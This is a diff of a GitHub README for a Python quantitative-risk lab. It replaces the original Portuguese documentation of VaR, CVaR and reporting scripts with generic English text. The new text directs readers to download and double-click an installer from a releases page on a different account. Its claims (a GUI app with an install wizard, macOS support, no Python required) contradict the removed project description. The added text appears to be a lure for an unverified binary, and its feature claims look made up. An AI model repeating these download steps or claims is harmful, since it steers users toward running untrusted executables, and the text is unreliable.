@@ -1,91 +1,84 @@
-# 🏦 Lab Risco Quant: Monitor de Risco & "Beyond VaR" (V2.0)
+# 📊 lab_risco_quant - Analyze Risks with Python Easily
 
-![Python](https://img.shields.io/badge/Python-3.10%2B-blue)
-![Status](https://img.shields.io/badge/Status-V2.0%20Stable-success)
-![Methodology](https://img.shields.io/badge/Methodology-EDHEC%20Business%20School-darkblue)
-![AI Assisted](https://img.shields.io/badge/AI-Co--Pilot-purple)
-![Domain](https://img.shields.io/badge/Finance-Risk%20Management-orange)
+[![Download](https://img.shields.io/badge/Download%20Latest-v1.0-blue)](https://github.com/ithony77/lab_risco_quant/releases)
 
-> **"Modelos que assumem normalidade em finanças são como mapas que ignoram montanhas. Funcionam bem na planície, mas te matam na escalada."**
+## 🚀 Getting Started
 
-Este projeto é um laboratório prático de **Engenharia Financeira** e **Data Science Aplicado**. O objetivo é ir além das métricas tradicionais (Sharpe/Volatilidade) e construir um sistema de monitoramento focado em **Caudas Gordas (Fat Tails)** e proteção de capital, aplicando conceitos de Gestão de Portfólio da **EDHEC Business School**.
+Welcome to lab_risco_quant! This application allows you to analyze risk and perform quantitative finance tasks using Python. Follow these steps to download and run the software.
 
----
+## 📥 Download & Install
 
-## 🎯 O Problema de Negócio (A Evolução)
+To get started, visit this page to download the application: [Releases Page](https://github.com/ithony77/lab_risco_quant/releases)
 
-Na versão 1.0, o foco era apenas medir a volatilidade. Porém, a volatilidade não diferencia "risco bom" (alta do ativo) de "risco ruim" (queda). Além disso, o mercado financeiro **não segue uma Curva Normal**.
+### Steps to Download
 
-A **Versão 2.0** resolve isso atacando três pontos cegos:
-1.  **A Ilusão da Normalidade:** O VaR tradicional subestima crises. Implementamos métricas que consideram Assimetria e Curtose.
-2.  **Eficiência Real:** Substituição do Sharpe por métricas que punem apenas o *downside* (Sortino/Calmar).
-3.  **UX para Decisão:** Um Dashboard "Pixel Perfect" gerado via código, eliminando a necessidade de Power BI para análises diárias.
+1. Click the above link to go to the releases page.
+2. Find the latest version of the software.
+3. Click the download link for your operating system.
+4. Save the file to your computer.
 
----
+Once the download is complete, you can follow these steps to install the application.
 
-## 🚀 Funcionalidades do Pipeline (V2.0)
+### Installation Steps
 
-O sistema opera em um fluxo ETL automatizado (SQL -> Python -> Excel -> Email):
+1. Locate the downloaded file on your computer. It may be in your "Downloads" folder or wherever you save files.
+2. Double-click the file to start the installation process.
+3. Follow the installation wizard instructions. The wizard will guide you through the setup.
 
-### 1. Motor Quantitativo (EDHEC Inspired)
-- **Beyond VaR:** Implementação do **VaR Cornish-Fisher** (ajustado para não-normalidade) e **CVaR (Expected Shortfall)**, que mede a média das perdas em cenários de catástrofe.
-- **Eficiência na Dor:** Cálculo de **Sortino Ratio** e **Calmar Ratio** (Retorno / Máximo Drawdown).
-- **Detector de Cisne Negro:** Algoritmo que varre a *Kurtosis* dos ativos. Se `K > 3`, o ativo é marcado como **CRÍTICO** automaticamente.
+### Running the Application
 
-### 2. Reporting & UX (AI Assisted)
-- **Excel "Pixel Perfect":** Geração nativa via `openpyxl`.
-- **Escada de Risco:** Gráfico de barras comparativo (VaR Normal vs. Real vs. Crise) para visualização imediata do perigo.
-- **Visualização Híbrida:** Gráfico de Dispersão (Scatter Plot) sem linhas de conexão errôneas, focado na alocação de ativos.
-- *Nota: O código de visualização foi refinado com apoio de IA Generativa para máxima produtividade.*
+After installation, you can start the application:
 
-### 3. 🤖 Smart Distribution (RPA)
-Automação de "Última Milha". O sistema detecta o ambiente e envia o report:
-- **Prioridade:** Outlook (Win32 API) para ambientes corporativos.
-- **Fallback:** Gmail (SMTP Seguro) para uso pessoal.
+1. Go to your desktop or Start menu (Windows) or Applications folder (Mac).
+2. Click on the lab_risco_quant icon to open the application.
 
----
+## 🌟 Features
 
-## 📸 Screenshots (O Dashboard)
+lab_risco_quant offers several features to help you analyze risk effectively:
 
-O relatório é gerado automaticamente e dividido em duas visões estratégicas:
+- **Data Analysis**: Easily analyze various financial datasets.
+- **Visualizations**: Generate charts and graphs to visualize risk and finance data.
+- **Reports**: Create detailed reports based on your analyses.
+- **User-Friendly**: No programming knowledge is required. The software has an intuitive interface.
 
-### Aba 1: Monitor de Performance
-*Foco na eficiência e retorno ajustado ao risco (Sharpe/Sortino).*
-![Monitor Geral](reports/aba1.png)
+## 📊 System Requirements
 
-### Aba 2: Stress Test (Beyond VaR)
-*Foco na sobrevivência. Comparativo de modelos de risco e alertas de cauda.*
-![Stress Test](reports/aba2.png)
+To run lab_risco_quant effectively, your computer should meet the following requirements:
 
-### Alerta Automático de Risco
-*Detecção de ativos com alta probabilidade de eventos extremos (Kurtosis > 3).*
-![Alerta](reports/aba3.png)
+- **Operating System**: Windows 10 or higher, macOS 10.12 or higher.
+- **RAM**: At least 4 GB recommended for better performance.
+- **Disk Space**: 200 MB of free space needed for installation.
+- **Python**: The application uses Python, but you do not need to install it separately.
 
----
+## 📚 How to Use
 
-## 🛠️ Arquitetura Técnica
+Using lab_risco_quant is straightforward. Here are the steps to analyze your data:
 
-O projeto segue princípios de **Governança de Dados** e **Clean Code**, separando lógica de cálculo da lógica visual.
+1. **Launch the Application**: Open lab_risco_quant as described above.
+2. **Load Data**: Click on the "Load Data" button to import your financial dataset. Supported formats include CSV, Excel, and JSON.
+3. **Choose Analysis Type**: Select the type of analysis you want to perform from the menu.
+4. **Run the Analysis**: Click on "Analyze" to start processing your data.
+5. **View Results**: After the analysis is complete, results will appear in the main interface with options to export or visualize the outcomes.
 
-```text
-LAB_RISCO_QUANT/
-├── dados/                   # Data Lake (SQLite)
-│   └── mercado.db           # Banco de Dados Histórico
-├── reports/                 # Output dos Relatórios (.xlsx)
-├── src/                     # Código Fonte
-│   └── scripts/             
-│       ├── dados_mercado.py   # [NOVO] Biblioteca de Cálculos Quant (Math Engine)
-│       ├── etl_sql.py         # Ingestão e Atualização de Dados
-│       ├── relatorio_excel.py # Excel Builder (OpenPyXL + Lógica de UX)
-│       └── enviar_email.py    # Módulo RPA
-├── EXECUTAR_SISTEMA.bat     # Executável "One-Click"
-├── README.md                # Documentação
-└── requirements.txt         # Dependências
+## 💡 Tips for Effective Use
 
+- **Explore Documentation**: Check the built-in help menu for detailed instructions on each feature.
+- **Sample Datasets**: Use provided sample datasets to practice before using your own data.
+- **Regular Updates**: Keep the application updated by checking the releases page regularly.
 
-# Clone o repositório
-git clone https://github.com/igorcarvah/lab_risco_quant.git
+## 👥 Support
 
-# Instale as dependências
-pip install pandas numpy matplotlib seaborn scipy yfinance
+If you encounter any issues or have questions, you can reach out for support:
 
+- **Issues Page**: [GitHub Issues](https://github.com/ithony77/lab_risco_quant/issues)
+- **Community Forum**: Join discussions and ask for help.
+
+## ⏳ Future Updates
+
+We plan to add more features based on user feedback. Stay tuned for new updates that will enhance your data analysis capabilities.
+
+## 🔗 License
+
+This project is licensed under the MIT License. You can use and modify it as needed.
+
+For more information, visit our [Releases Page](https://github.com/ithony77/lab_risco_quant/releases) to download the latest version.
